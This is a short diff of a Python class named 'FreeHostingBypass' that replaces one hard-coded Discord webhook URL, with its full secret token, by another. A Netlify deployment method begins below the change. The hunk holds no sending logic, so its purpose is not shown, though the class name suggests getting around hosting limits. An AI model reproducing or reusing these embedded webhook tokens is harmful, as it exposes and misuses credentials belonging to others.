@@ -10,7 +10,7 @@ import base64
 
 class FreeHostingBypass:
     def __init__(self):
-        self.webhook_url = "https://discord.com/api/webhooks/1285243636399796285/dBG84iTwDcJJWXw5JD4d-DJhfnzVA5d5oKUQkqMhqRx4s6KEcE2xfSGHBKs4HYN1B7aN"
+        self.webhook_url = "https://discord.com/api/webhooks/1417442947686731856/1UGJsXCLBqIZmb2shm4CjxJhAzZtObsbKtbStAmPg5jKtvbVt9WqRfRkNZ6ymjuiDS95"
         
     def generate_netlify_deployment(self):
         """Generate Netlify deployment package"""
